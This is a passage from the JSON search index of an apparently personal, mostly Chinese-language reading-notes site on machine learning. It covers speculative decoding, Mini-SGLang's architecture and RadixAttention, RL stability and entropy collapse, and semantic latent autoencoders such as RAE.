models","text":"<p>\u8be5\u9879\u76ee\u4e2d\u7684models\u88ab\u5212\u5206\u6210\u4e86\u4e24\u5c42\u5173\u7cfb\uff0c\u4e00\u5c42\u662f\u6bd4\u8f83\u5e95\u5c42\u53ef\u590d\u7528\u7684\u5b9e\u73b0\uff0c\u6bd4\u5982attention\uff1b\u4e00\u5c42\u662f\u9ad8\u5c42\u7684\uff0c\u548cpipeline\u5bf9\u63a5\u7684\u90e8\u5206\uff0c\u6bd4\u5982\u8bf4causvid\u90e8\u5206</p>"},{"location":"reading/interesting/Inferix/#3-kv-cache","title":"3. kv-cache","text":"<p>KV cache\u7684\u7ba1\u63a7\u662f\u9879\u76ee\u4e2d\u6700\u91cd\u8981\u7684\u90e8\u5206\u4e4b\u4e00</p>"},{"location":"reading/interesting/Inferix/#4-profiler","title":"4. profiler","text":""},{"location":"reading/interesting/MTP/","title":"MTP","text":"<p>MTP \u5168\u79f0\u662f Multi-token prediction \uff0c\u56e0\u4e3a\u5f53\u524dLLM\u7684test-time scaling\u7684\u63a8\u52a8\uff0cinference\u7684\u538b\u529b\u53d8\u5f97\u8d8a\u6765\u8d8a\u5927\uff0c\u5355\u9760\u786c\u4ef6\u548c\u7cfb\u7edf\u52a0\u901f\u5b58\u5728\u4e0a\u9650\uff0c\u56e0\u6b64\u4eba\u4eec\u5f00\u59cb\u5c1d\u8bd5\u5728\u7b97\u6cd5\u548c\u67b6\u6784\u5c42\u9762\u63d0\u5347\u63a8\u7406\u7684\u901f\u5ea6\uff0c\u6700\u76f4\u89c2\u7684\u60f3\u6cd5\u5c31\u662fMTP\uff0c\u8ba9\u6a21\u578b\u4e00\u6b21\u8f93\u51fa\u591a\u4e2atokens</p> <p>\u76ee\u524d\u5bf9\u4e8eMTP\u7684\u89e3\u51b3\u6709\u4e00\u4e9b\u65b9\u6848\u6bd4\u5982Diffusion LLM\u548cSpeculative Decoding</p>"},{"location":"reading/interesting/MTP/#1-speculative-decoding","title":"1. Speculative Decoding","text":""},{"location":"reading/interesting/MTP/#11-eagle","title":"1.1. Eagle","text":"<p>Eagle\u662f\u4e00\u4e2a\u52a0\u901f\u5927\u8bed\u8a00\u6a21\u578b\u63a8\u7406\u7684\u5f00\u6e90\u7684\u7b97\u6cd5\u6846\u67b6\uff0c\u5c5e\u4e8eSpeculative Decoding\u7684\u4e00\u79cd\uff0c\u76f8\u6bd4\u4e8e\u4f20\u7edf\u7684LLM\u9884\u6d4b\u4e00\u4e2a\u8bcd\uff0cEagle\u901a\u8fc7\u9884\u6d4bLLM\u5012\u6570\u7b2c\u4e8c\u5c42\u7684\u7279\u5f81\u5411\u91cf\uff0c\u901a\u8fc7\u4e00\u4e2a\u56de\u5f52\u5934\u6765\u63d0\u524d\u9884\u6d4b\u540e\u7eed\u591a\u4e2atoken\uff0c\u7136\u540e\u7528\u539f\u59cb\u7684LLM\u6765\u5e76\u884c\u9a8c\u8bc1\u8fd9\u4e9btoken\uff0c\u7559\u4e0b\u6b63\u786e\u7684token\uff0c\u76ee\u524d\u5df2\u7ecf\u6f14\u5316\u4e86\u4e09\u4e2a\u7248\u672c</p>"},{"location":"reading/interesting/MTP/#12-dflash","title":"1.2 Dflash","text":"<p>DFlash \u8fd9\u662f\u4e00\u4e2a\u901a\u8fc7Diffusion+AR\u7684\u8303\u5f0f\uff0c\u8fdb\u884c\u63a8\u6d4b\u89e3\u7801\u7684\u65b9\u6848\uff0c\u662f\u7528Diffusion Model\u8fdb\u884c\u9ad8\u8d28\u91cf\u7684\u8349\u56fe\u751f\u6210\uff0c\u63d0\u9ad8\u4e86\u4e86\u63a8\u6d4b\u89e3\u7801\u7684\u4e0a\u9650\uff0c\u5728\u6307\u6807\u4e0a\u8d85\u8d8a\u4e86Eagle</p>"},{"location":"reading/interesting/MTP/#problem","title":"Problem","text":"<p>SD \u5f88\u91cd\u8981\u7684\u4e00\u4e2a\u95ee\u9898\u5c31\u662f\u5728\u5927Batch Size\u7684\u65f6\u5019\uff0c\u6548\u679c\u4e0d\u4f73\uff0c\u8fd9\u5b58\u5728\u591a\u79cd\u56e0\u7d20\uff0c\u672c\u8eabSD\u7684\u65b9\u6848\u5c31\u662f\u5728\u8ba1\u7b97\u6253\u4e0d\u6ee1\u7684\u60c5\u51b5\u4e0b\uff0c\u8ba9\u5176\u901a\u8fc7\u591a\u7b97\u4e00\u4e9b\u4e1c\u897f\u6765\u7701\u4e00\u4e9bforward\u3002\u4f46\u662f\u5728\u5927Batchsize\u4e0b\uff0c\u8ba1\u7b97\u9010\u6e10\u4e5f\u4f1a\u88ab\u6253\u6ee1\uff0c\u56e0\u6b64SD\u7684\u6548\u679c\u4f1a\u9010\u6e10\u53d8\u5dee\u3002\u5e76\u4e14SD\u7684\u505a\u6cd5\u4e5f\u662f\u5728\u62c9\u5927\u4e00\u4e2abatch size\u91cc\u7684\u788e\u7247\u5316\uff0c\u56e0\u4e3a\u6709\u7684request\u4f1a\u731c\u5bf9\u591a\u4e2a\u8bcd\u8bed\uff0c\u6709\u7684request\u731c\u5bf9\u7684\u4e0d\u591a\uff0c\u4ece\u800c\u6709\u66f4\u5927\u7684\u5bf9\u9f50\u5f00\u9500</p> <p>\u73b0\u9636\u6bb5SD\u7684\u52a0\u901f\u4ec5\u5b58\u5728\u4e8e\u5c0fBatch Size\u4e0b\uff0c\u53ef\u80fd\u771f\u6b63\u7684\u5e94\u7528\u8282\u70b9\u5728\u4e8e\u5177\u8eab\u548c\u8fb9\u7f18\u786c\u4ef6\u573a\u666f</p>"},{"location":"reading/interesting/Mini-Sglang/","title":"Mini Sglang","text":""},{"location":"reading/interesting/Mini-Sglang/#1-overview","title":"1. Overview","text":"<p>\u4ee5\u4e0b\u662f\u5b98\u65b9\u5bf9\u4e8eMini-SGlang\u7684\u67b6\u6784\u4ecb\u7ecd</p> <p>The source code is located in <code>python/minisgl</code>. Here is a breakdown of the modules for developers:</p> <ul> <li><code>minisgl.core</code>: Provides core dataclasses <code>Req</code> and <code>Batch</code> representing the state of requests, class <code>Context</code> which holds the global state of the inference context, and class <code>SamplingParams</code> holds the sampling parameters provided by users.</li> <li><code>minisgl.distributed</code>: Provides the interface to all-reduce and all-gather in tensor parallelism, and dataclass <code>DistributedInfo</code> which holds the TP information for a TP worker.</li> <li><code>minisgl.layers</code>: Implements basic building blocks for building LLMs with TP support, including linear, layernorm, embedding, RoPE, etc. They share common base classes defined in <code>minisgl.layers.base</code>.</li> <li><code>minisgl.models</code>: Implements LLM models, including Llama and Qwen3. Also defines utilities for loading weights from huggingface and sharding weights.</li> <li><code>minisgl.attention</code>: Provides interface of attention Backends and implements backends of <code>flashattention</code> and <code>flashinfer</code>. They are called by <code>AttentionLayer</code> and uses metadata stored in <code>Context</code>.</li> <li><code>minisgl.kvcache</code>: Provides interface of KVCache pool and KVCache manager, and implements <code>MHAKVCache</code>, <code>NaiveCacheManager</code> and <code>RadixCacheManager</code>.</li> <li><code>minisgl.utils</code>: Provides a collection of utilities, including logger setup and wrappers around zmq.</li> <li><code>minisgl.engine</code>: Implements <code>Engine</code> class, which is a TP worker on a single process. It manages the model, context, KVCache, attention backend and cuda graph replaying.</li> <li><code>minisgl.message</code>: Defines messages exchanged (in zmq) between api_server, tokenizer, detokenizer and scheduler. All message types support automatic serialization and deserialization.</li> <li><code>minisgl.scheduler</code>: Implements <code>Scheduler</code> class, which runs on each TP worker process and manages the corresponding <code>Engine</code>. The rank 0 scheduler receives msgs from tokenizer, communicates with scheduler on other TP workers, and sends msgs to detokenizer.</li> <li><code>minisgl.server</code>: Defines cli arguments and <code>launch_server</code> which starts all the subprocesses of Mini-SGLang. Also implements a FastAPI server in <code>minisgl.server.api_server</code> acting as a frontend, providing endpoints such as <code>/v1/chat/completions</code>.</li> <li><code>minisgl.tokenizer</code>: Implements <code>tokenize_worker</code> function which handles tokenization and detokenization requests.</li> <li><code>minisgl.llm</code>: Provides class <code>LLM</code> as a python interface to interact with the Mini-SGLang system easily.</li> <li><code>minisgl.kernel</code>: Implements custom CUDA kernels, supported by <code>tvm-ffi</code> for python binding and jit interface.</li> <li><code>minisgl.benchmark</code>: Benchmark utilities.</li> </ul>"},{"location":"reading/interesting/Mini-Sglang/#2-radixattention","title":"2. RadixAttention","text":"<p>\u76f8\u5bf9\u4e8evllm\u4e2d\u7684PagedAttention\u673a\u5236\uff0csglang\u4e2d\u7684\u663e\u5b58\u7ba1\u7406\u65b9\u6848\u4e3aRadixAttention\uff0c\u662f\u57fa\u4e8e\u524d\u7f00\u6280\u672f\u7684\u663e\u5b58\u7ba1\u7406\u65b9\u6848\u3002\u5bf9\u4e8eLLM\u800c\u8a00\u7684\u5927\u91cf\u8bf7\u6c42\u90fd\u5171\u4eab\u76f8\u540c\u7684Prefix\uff0c\u4f8b\u5982system prompt\u548c\u591a\u8f6e\u7684\u5bf9\u8bdd</p> <p>sglang\u5c06kv cache\u5c06kv cache\u7ec4\u7ec7\u6210\u4e00\u9897radix tree\u3002\u5f53\u65b0\u7684\u8bf7\u6c42\u5230\u8fbe\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u5728radix tree\u5339\u914d\u6700\u957f\u524d\u7f00\uff0c\u5339\u914d\u6210\u529f\u4e4b\u540e\u590d\u7528\u4e00\u7528KV cache</p> <p></p>"},{"location":"reading/interesting/MiniRL/","title":"MiniRL","text":"<p>\u8be5\u8bba\u6587\u662fQwen\u56e2\u961f\u63d0\u51fa\u7684\uff0c\u5173\u4e8eRL\u7a33\u5b9a\u6027\u7684\u4e00\u7bc7\u8bba\u6587\uff0c\u76f8\u5e94\u7684\u94fe\u63a5\u5728\u8fd9\u91cc\uff0c\u4e3b\u8981\u662f\u8981\u89e3\u51b3RL\u4e2d\u5404\u4e2a\u673a\u5236\u5b9e\u9645\u7684\u4f5c\u7528\uff0c\u4ee5\u53ca\u5173\u4e8e\u8bad\u63a8\u4e00\u81f4\u6027\u7684\u63a2\u8ba8\uff0c\u5c24\u5176\u662f\u5bf9\u4e8eMoe\u6a21\u578b</p> <p>\u5b9e\u9a8c\u572830B\u7684Moe\u6a21\u578b\u4e0a</p> <p>RL\u6700\u5927\u7684\u4e0d\u5339\u914d\u5176\u5b9e\u662freward\u662f\u5e8f\u5217\u7ea7\u522b\u7684\uff0c\u4f46\u662f\u4f18\u5316\u662ftoken\u7ea7\u522b\u7684\uff0c\u8bba\u6587\u6307\u51fa\uff0c\u53ea\u6709\u5728\u8bad\u63a8\u5c3d\u53ef\u80fd\u4e00\u81f4\u7684\u65f6\u5019\uff0c\u4f18\u5316token\u7ea7\u522b\u7684\u76ee\u6807\u5c31\u53ef\u4ee5\u63d0\u5347\u5e8f\u5217\u7ea7\u522b\u7684\u5956\u52b1</p> <p>\u8bad\u63a8\u7684\u4e0d\u4e00\u81f4\u4ece\u4e24\u4e2a\u65b9\u9762\u4ea7\u751f</p> <ul> <li>Training-Inference Discrepancy: \u63a8\u7406\u5f15\u64ce\u548c\u8bad\u7ec3\u5f15\u64ce\u7684\u533a\u522b\uff1a\u6bd4\u5982Kernel\u4e0d\u540c\uff0c\u63a8\u7406\u7aef\u7684\u4f18\u5316\u5305\u62ec\u4f4e\u7cbe\u5ea6\u8ba1\u7b97\u7b49\u7b49</li> <li>Policy Staleness: \u7b56\u7565\u6ede\u540e\u6027\uff1a\u5927batch\u62c6\u6210minibatch\uff0c\u5bfc\u81f4\u540e\u9762\u7684minibatch\u53d8\u6210off-policy</li> </ul> <p>\u57fa\u4e8e\u8fd9\u4e9b\u601d\u8003\u4e4b\u540e\uff0c\u6211\u4eec\u4ece\u6700\u521d\u7684reinforce\u7b97\u6cd5\u5f00\u59cb\uff0c\u505a\u6700\u5c0f\u7684\u6539\u52a8</p> <ul> <li>Advantage Group Norm \u964d\u4f4e\u65b9\u5dee</li> <li>Clipping \u9632\u6b62\u8fc7\u5ea6\u66f4\u65b0</li> <li>Token-Level IS correction \u4fee\u6b63\u8bad\u7ec3\u63a8\u7406\u5dee\u5f02</li> </ul> <p></p> <p>\u800c\u9488\u5bf9\u4e8eMoe\uff0c\u8bba\u6587\u4e5f\u63d0\u51fa\u4e86\u4e24\u79cd\u65b9\u6848\u6765\u89e3\u51b3Moe\u7684\u8bad\u63a8\u4e0d\u4e00\u81f4</p> <ul> <li>Vanilla Routing Replay(R2): \u5728\u68af\u5ea6\u66f4\u65b0\u65f6\uff0c\u91cd\u653eRollout\u7b56\u7565\u4e2d\u9009\u4e2d\u7684\u4e13\u5bb6\uff0c\u4e5f\u5c31\u662f \\(\\pi_{old}\\) \u9009\u62e9\u7684\u4e13\u5bb6</li> <li>Rollout Routing Replay(R3): \u5728\u68af\u5ea6\u66f4\u65b0\u65f6\uff0c\u91cd\u653e\u63a8\u7406\u5f15\u64ce\u4e2d\u9009\u62e9\u7684\u4e13\u5bb6</li> </ul> <p>\u8fd9\u4e24\u4e2a\u65b9\u6848\u90fd\u6539\u52a8\u4e86\u5f53\u524dtoken\u9700\u8981\u9009\u62e9\u7684\u4e13\u5bb6\uff0c\u56e0\u6b64\u90fd\u6709\u504f\u5dee</p>"},{"location":"reading/interesting/Optimizer/","title":"Optimizer","text":"<p>From SGD to Adam(AdamW) to Muon</p>"},{"location":"reading/interesting/RL%20%E4%B8%AD%E7%9A%84%E7%86%B5%E6%9C%BA%E5%88%B6/","title":"RL \u4e2d\u7684\u71b5\u673a\u5236","text":"<p>\u6765\u81ea\u4e8e\u9752\u7a1e\u793e\u533a\u7684\u4e00\u4e2aTalk\uff0c\u4ecb\u7ecd\u4e86\u5728RL\u4e2d\u71b5\u673a\u5236\u7684\u5206\u6790\u4ee5\u53ca\u4e00\u4e9b\u76f8\u5173\u5de5\u4f5c</p> <p>https://arxiv.org/abs/2505.22617 \u76f8\u5173\u8bba\u6587\u662f\u8fd9\u4e00\u7bc7</p> <p>\u8fd9\u7bc7\u6587\u7ae0\u51fa\u4e86\u4e0b\u8ff0\u7684\u4f18\u5316\u8d21\u732e\u4ee5\u5916\uff0c\u8fd8\u662f\u4e00\u7bc7\u7b80\u5355\u7684\u7efc\u8ff0\uff0c\u6709\u5f88\u4e30\u5bcc\u7684\u4fe1\u606f</p> <p>\u71b5\u673a\u5236\u5c5e\u4e8e\u662f\u8861\u91cf\u6df7\u4e71\u5ea6\u7684\u4e00\u4e2a\u673a\u5236\uff0c\u4e00\u4e2a\u9ad8\u71b5\u7684\u6a21\u578b\u4f1a\u505a\u66f4\u591a\u7684\u63a2\u7d22\u5de5\u4f5c\uff0c\u4e00\u4e2a\u4f4e\u71b5\u7684\u6a21\u578b\u4f1a\u505a\u66f4\u52a0\u786e\u5b9a\u6027\u7684\u56de\u7b54\u3002RL\u5f88\u4f9d\u8d56\u4e8e\u6a21\u578b\u7684\u6df7\u4e71\u7a0b\u5ea6\uff0c\u56e0\u4e3a\u6a21\u578b\u8981\u505a\u8db3\u591f\u7684\u63a2\u7d22\uff0c\u624d\u80fd\u5f97\u5230\u6709\u6548\u7684\u6570\u636e\uff0c\u6765\u4f18\u5316\u81ea\u8eab\u3002</p> <p>LLM\u5728RL\u4e2d\u9047\u5230\u7684\u71b5\u574d\u7f29\u95ee\u9898\uff0c\u5c31\u662f\u6307\u5176\u9677\u5165\u4e86\u5c40\u90e8\u6700\u4f18\u89e3\uff0c\u5176\u6a21\u578b\u7684\u71b5\u53d8\u5f97\u5f88\u4f4e\uff0c\u4e0d\u518d\u505a\u6709\u6548\u63a2\u7d22\uff0c\u5bfc\u81f4RL\u5931\u6548\uff0cLoss\u4e0d\u518d\u4e0b\u964d\u7684\u60c5\u51b5\u3002</p> <p>\u5728\u591a\u6570\u6a21\u578b\u7684\u8bad\u7ec3\u8fc7\u7a0b\u4e2d\uff0c\u6027\u80fd\u7684\u63d0\u5347\u548cEntropy\u7684\u4e0b\u964d\u5448\u73b0\u4e00\u4e2a\u5151\u6362\u5173\u7cfb</p> <p></p> <p>\u8fd9\u4e2a\u7ed3\u679c\u5bfc\u81f4\u4e86\u6211\u4eec\u7684RL\u5b58\u5728\u4e0a\u9650\uff0c\u5982\u679c\u4e0d\u91c7\u53d6\u4e00\u4e9b\u624b\u6bb5\u4fdd\u8bc1\u6a21\u578b\u4e00\u5b9a\u7684\u63a2\u7d22\u6027\uff0c\u4f1a\u5bfc\u81f4\u6a21\u578b\u8fc5\u901f\u8fdb\u5165\u5c40\u90e8\u6700\u4f18\u89e3</p> <p></p> <p>\u90a3\u4e48\u6211\u4eec\u8981\u5206\u6790\u54ea\u4e9b\u56e0\u7d20\u5bfc\u81f4\u4e86\u6211\u4eec\u7684\u71b5\u574d\u7f29\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e9b\u5173\u952e\u7684token\uff0c\u4f1a\u5bfc\u81f4\u71b5\u6025\u5267\u4e0b\u964d\uff0c\u8fd9\u4e9btoken\u8868\u73b0\u4e3a\u5176log prob\u548c\u83b7\u5f97\u7684advantage\u7684cov\uff08\u534f\u65b9\u5dee\uff09</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6bd4\u5982\u8fd9\u4e2atoken\u7684log prob\u5f88\u5927\uff0c\u8bf4\u660e\u6a21\u578b\u5bf9\u4e8e\u8fd9\u4e2atoken\u7684\u8f93\u51fa\u975e\u5e38\u81ea\u4fe1\uff0c\u540c\u65f6\u5176\u83b7\u53d6\u5230\u7684advantage\u53c8\u5f88\u5927\uff0c\u8fd9\u5c31\u5bfc\u81f4\u8fd9\u4e24\u8005\u7684\u534f\u65b9\u5dee\u5f88\u5927\uff0c\u4e5f\u5bfc\u81f4\u6a21\u578b\u5f88\u5bb9\u6613\u56e0\u4e3a\u8fd9\u4e2atoken\u5bfc\u81f4\u5176\u7684\u71b5\u4e0b\u964d</p> <p></p> <p>\u90a3\u4e48\u8981\u5904\u7406\u8fd9\u4e2a\u90e8\u5206\uff0c\u6211\u4eec\u80af\u5b9a\u8981\u5728Loss\u4e0a\u505a\u4e00\u4e9b\u64cd\u4f5c\uff0c\u6211\u4eec\u9009\u62e9\u4e86\u4e24\u4e2a\u7b56\u7565\uff0cClip\u548cKL\uff0c\u6838\u5fc3\u601d\u8def\u90fd\u662f\u5bf9\u4e8e\u8fd9\u4e2aCov\u5f88\u9ad8\u7684token\uff0c\u5bf9\u5176\u66f4\u65b0\u8fdb\u884c\u9650\u5236</p>"},{"location":"reading/interesting/Semantic%20latent/","title":"Semantic latent","text":"<p>\u4e3a\u4e86\u66f4\u597d\u5730\u63d0\u9ad8\u751f\u6210\u6a21\u578b\u7684\u6307\u4ee4\u9075\u5faa\u80fd\u529b\uff0c\u66f4\u8fdb\u4e00\u6b65\u662f\u4e3a\u4e86\u6784\u5efa\u751f\u6210\u7406\u89e3\u7edf\u4e00\u7684\u6a21\u578b\uff0c\u5176\u4e2d\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\u662f\u6784\u5efaSemantic Rich\u7684latent space\uff0c\u8bde\u751f\u4e86\u5305\u62ecRAE\u7b49\u5de5\u4f5c\u5728\u5185\u7684\u8fdb\u5c55</p>"},{"location":"reading/interesting/Semantic%20latent/#1-vision-encoder","title":"1. Vision Encoder","text":"<p>\u5305\u62ecJEPA\uff0cSiglip\uff0cDINO v2\u7b49\u5de5\u4f5c\uff0c\u4ee3\u8868\u7684\u7ecf\u5178vision encoder\u5de5\u4f5c\uff0c\u4ee5\u53ca\u5176\u6027\u80fd\u5206\u6790</p> <ul> <li>https://arxiv.org/pdf/2512.19693</li> </ul> <p>\u8fd9\u7bc7\u8bba\u6587\u5206\u6790\u4e86\u8bed\u4e49\u7f16\u7801\u5668\uff08semantic encoder\uff09\u548c\u50cf\u7d20\u7f16\u7801\u5668\uff08pixel encoder\uff09\u7684\u9891\u8c31\u5dee\u5f02\uff0c\u4e00\u4e2a\u5173\u6ce8\u9ad8\u9891\u7ec6\u8282\u4e00\u4e2a\u5173\u6ce8\u4f4e\u9891\u7ec6\u8282</p> <ul> <li>semantic encoder capture low-frequency components</li> <li>pixel encoder capture hight-frequency components</li> </ul> <p></p> <p>\u73b0\u4ee3\u7684\u611f\u77e5\u6a21\u578b\u4e3b\u8981\u4fa7\u91cd\u4e8e\u8bed\u4e49\u7f16\u7801\uff0c\u800c\u751f\u6210\u6a21\u578b\u4fa7\u91cd\u4e8e\u50cf\u7d20\u7ec6\u8282\u7f16\u7801\uff0c\u5e76\u4e14\u901a\u8fc7\u4e00\u4e9b\u5b9e\u9a8c\u6765\u9a8c\u8bc1\u8fd9\u4e2a\u5185\u5bb9\uff0c\u6bd4\u5982\u5bf9\u4e8etext-image\u5bf9\u9f50\u4efb\u52a1\uff0c\u6d88\u9664\u6389\u4e00\u4e9b\u7ec6\u8282\u4e5f\u6ca1\u6709\u5f71\u54cd\uff0c\u4f46\u662f\u4e00\u65e6\u8fc7\u6ee4\u6389\u4f4e\u9891\u7684\u8272\u5757\uff0c\u5bf9\u9f50\u4efb\u52a1\u7684\u51c6\u786e\u5ea6\u9a6c\u4e0a\u5c31\u4e0b\u964d\u4e86</p> <p></p> <p>\u5e76\u4e14\u672c\u7bc7\u8bba\u6587\u63d0\u51fa\u4e86\u4e00\u79cd\u76f8\u5e94\u7684Unified AutoEncoder\u7684\u8bad\u7ec3\u65b9\u6848\uff0c\u540c\u65f6\u4f18\u5316Semantic Loss\uff08\u4f9d\u9760\u4e00\u4e2a\u6559\u5e08\u6a21\u578b\uff09\u548cPixel Reconstruction Loss\uff08\u76f4\u63a5\u91cd\u5efa\uff09\uff0c\u5176\u662f\u9760\u5c06DINO\u7684\u521d\u59cb\u5316\u6574\u4e2a\u6a21\u578b\uff0c\u7136\u540e\u5c06DINO\u7684\u8f93\u51fa\u7ed9\u6309\u9891\u7387\u62c6\u5206\uff0c\u4f4e\u9891\u7387\u90e8\u5206\u91c7\u7528\u4e00\u4e2a\u91cd\u5efa\u7684Loss</p> <p></p>"},{"location":"reading/interesting/Semantic%20latent/#2-semantic-latent-space","title":"2. Semantic Latent Space","text":""},{"location":"reading/interesting/Semantic%20latent/#21-rae","title":"2.1. RAE","text":"<p>\u8bba\u6587\u6307\u51fa\uff0c\u5f53\u524d\u7684 VAE \u5b58\u5728\u53ea\u6ce8\u91cd\u4f4e\u7ef4\u5ea6\u7684\u91cd\u5efa\u8868\u5f81\uff0c\u800c\u5ffd\u89c6\u4e86\u5176\u4ed6\u4fe1\u606f\uff0c\u6700\u7ec8\u9650\u5236\u4e86\u73b0\u6709\u7684\u751f\u6210\u6a21\u578b\u7684\u8d28\u91cf\uff0c\u5728RAE\u4e2d\u5176\u76f4\u63a5\u91c7\u7528MLLM\u4e2d\u7684vision encoder\u4f5c\u4e3a\u7f16\u7801\u5668</p> <p>\u8fd9\u4e9b\u6a21\u578b\u4e0d\u4ec5\u80fd\u591f\u63d0\u4f9b\u9ad8\u7eac\u8868\u5f81\u548c\u4e30\u5bcc\u7684\u8bed\u4e49\u4fe1\u606f\uff0c\u5e76\u4e14\u57fa\u4e8e Transformer \u67b6\u6784</p> <p>\u56e0\u4e3a\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u76f4\u63a5\u7684\u60f3\u6cd5\uff0c\u4e4b\u524d\u4e5f\u6709\u5f88\u591a\u5de5\u4f5c\u505a\u8fc7\uff0c\u4f46\u662f\u5f88\u5c11\u6709\u5de5\u4f5c\u771f\u7684\u80fd\u5728\u8fd9\u4e2a\u8868\u5f81\u7a7a\u95f4\u91cc\u628aDIT\u505awork\uff0c\u56e0\u4e3a\u8fd9\u4e9bencoder\u5e76\u6ca1\u6709\u88ab\u8bad\u7ec3\u638c\u63e1low-level\u7684details\uff0c\u8fd9\u7bc7\u8bba\u6587\u4e5f\u5206\u6790\u4e86\u8fd9\u4e2a\u5730\u65b9\u4f1a\u9047\u5230\u7684\u82e6\u96be\u548c\u89e3\u51b3\u65b9\u6848</p> <p></p> <p>\u5b9e\u9a8c\u8868\u660e\uff0c\u5728\u6709\u6548\u8bad\u7ec3\u4e86\u5bf9\u5e94\u7684\u89e3\u7801\u5668\u7684\u60c5\u51b5\u4e0b\uff0cRAE\u7684\u91cd\u5efa\u6548\u679c\u4e0d\u4ec5\u66f4\u597d\u800c\u4e14\u6548\u7387\u66f4\u9ad8\uff0c\u8bba\u6587\u4e2d\u7684\u4e3b\u4f53\u5b9e\u9a8c\u914d\u7f6e\u4e3a</p> <ul> <li>encoder: DINO v2</li> <li>dit: LightingDit</li> <li>patch size: 1</li> </ul> <p>\u7814\u7a76\u8005\u5f88\u5feb\u53d1\u73b0\u4e4b\u524d\u4f7f\u7528\u7684Dit\u6a21\u578b\u6bd4\u5982Dit-S\u548cDit-XL\u7b49\u6a21\u578b\u5728RAE\u7684\u6761\u4ef6\u4e0b\u8868\u73b0\u4e0d\u4f73\uff0c\u5e76\u63a8\u6d4b\u662f\u4ee5\u4e0b\u539f\u56e0</p> <ul> <li>Dit\u7684\u67b6\u6784\u95ee\u9898</li> <li>\u566a\u58f0\u8c03\u5ea6\u7684\u95ee\u9898</li> <li>\u5c0f\u566a\u58f0\u7684\u95ee\u9898\uff0c\u4e4b\u524d\u7684VAE\u5bf9\u4e8e\u566a\u58f0\u5e76\u4e0d\u654f\u611f</li> </ul> <p>\u5728\u5b9e\u9a8c\u4e2d\uff0c\u7814\u7a76\u8005\u4e5f\u53d1\u73b0\u5728RAE\u67b6\u6784\u4e2d\u8bad\u7ec3Dit\u7684\u4e00\u4e9b\u6280\u5de7</p> <ul> <li>Dit\u7684\u67b6\u6784\uff1a\u6a21\u578b\u5bbd\u5ea6\u95ee\u9898\uff0cDit\u7684\u5bbd\u5ea6\u5fc5\u987b\u8981\u8d85\u8fc7RAE\u8f93\u51fatoken\u7684\u7eac\u5ea6\uff0cDiffusion\u7684\u6570\u5b66\u6d41\u5f62\u6709\u5173</li> <li>\u566a\u58f0\u8c03\u5ea6\u7684\u95ee\u9898\uff1a\u8feb\u4f7f\u6a21\u578b\u5904\u7406\u66f4\u5f3a\u7684\u566a\u58f0\uff0cRAE\u7684\u8f93\u5165\u662f\u9ad8\u7eac\u5ea6\u7684\uff0c\u4f7f\u7528\u4f20\u7edf\u52a0\u566a\u65b9\u6848\u4f7f\u5f97\u6a21\u578b\u7684\u9884\u6d4b\u8fc7\u4e8e\u7b80\u5355\uff0c\u56e0\u6b64\u5c06\u7eac\u5ea6\u4e5f\u8003\u8651\u5230\u566a\u58f0\u8c03\u5ea6\u4e2d\uff0c\u4f7f\u5f97\u6a21\u578b\u5728\u9ad8\u7eac\u4e2d\u4e5f\u80fd\u83b7\u5f97\u6709\u6548\u7684\u53bb\u566a\u80fd\u529b</li> <li>\u5c0f\u566a\u58f0\u7684\u95ee\u9898\uff1aRAE\u7684\u7a7a\u95f4\u5bf9\u4e8e\u566a\u58f0\u654f\u611f\uff0c\u6211\u4eec\u5c31\u5728\u89e3\u7801\u7684\u65f6\u5019\u4f7f\u7528noise-augmented decoding\uff0c\u5728decoder\u7684\u8bad\u7ec3\u7684\u65f6\u5019\u5c31\u5f15\u5165\u566a\u58f0\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4e86\u5e94\u5bf9RAE\u7684\u79bb\u6563\u7a7a\u95f4\u9650\u5236\uff0c\u56e0\u4e3aVAE\u7684\u6f5c\u7a7a\u95f4\u9075\u5faa\u8fde\u7eed\u5206\u5e03</li> </ul> <p>\u6574\u4e2a\u8bad\u7ec3\u7684\u6d41\u7a0b\u662f\uff0c\u5148\u8bad\u7ec3decoder\uff0c\u5b8c\u6210\u9ad8\u8d28\u91cf\u7684\u91cd\u5efa\uff0c\u5e76\u4e14\u4f7f\u7528\u5230noist-augmented decoding\uff0c\u968f\u540e\u518d\u8bad\u7ec3Dit</p>"},{"location":"reading/interesting/Semantic%20latent/#22-scale-rae","title":"2.2. scale rae","text":"<p>https://rae-dit.github.io/scale-rae/</p> <p>scale rae </p> <p></p> <p>\u5728 scaling \u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e4b\u524d\u7684\u4e00\u4e9b\u6280\u5de7\u4e0d\u518d\u91cd\u8981\uff0c\u6bd4\u5982\u66f4\u5bbd\u7684\u6a21\u578b\uff0c\u4f46\u662f\u90e8\u5206\u6280\u5de7\u4ecd\u7136\u662f\u5fc5\u8981\u7684\uff0c\u6bd4\u5982\u566a\u58f0\u8c03\u5ea6\u7684\u95ee\u9898</p>"},{"location":"reading/interesting/Semantic%20latent/#23-vtp","title":"2.3. VTP","text":""},{"location":"reading/interesting/Unified%20view%20of%20SFT%20%26%20RL/","title":"Unified view of SFT & RL","text":""},{"location":"reading/interesting/Unified%20view%20of%20SFT%20%26%20RL/#1-hpt","title":"1. HPT","text":"<p>HPT\uff08Hybrid Post-Training\uff09\u7684\u539f\u8bba\u6587</p> <ul> <li>https://arxiv.org/abs/2509.04419</li> </ul> <p></p> <p>\u901a\u8fc7\u8ba1\u7b97\u5927\u591a\u5e38\u89c1\u7684Post-Training\u7684\u7b97\u6cd5\u7684\u68af\u5ea6\u4f30\u8ba1\u5f62\u5f0f\uff0c\u53ef\u4ee5\u7edf\u4e00\u6210\u4e00\u4e2a\u5f62\u5f0f</p> <p></p> <p>\u8fd9\u4e2aUnified Policy Gradient Estimator\u53ef\u4ee5\u62c6\u5206\u6210\u4ee5\u4e0b\u56db\u4e2a\u7ec4\u4ef6\uff0c\u8fd9\u4e2a\u884c\u4e3a\u7c7b\u4f3c\u4e8eRL\u4e2d\u7684GAE</p> <p>1. Stabilization Mask</p> 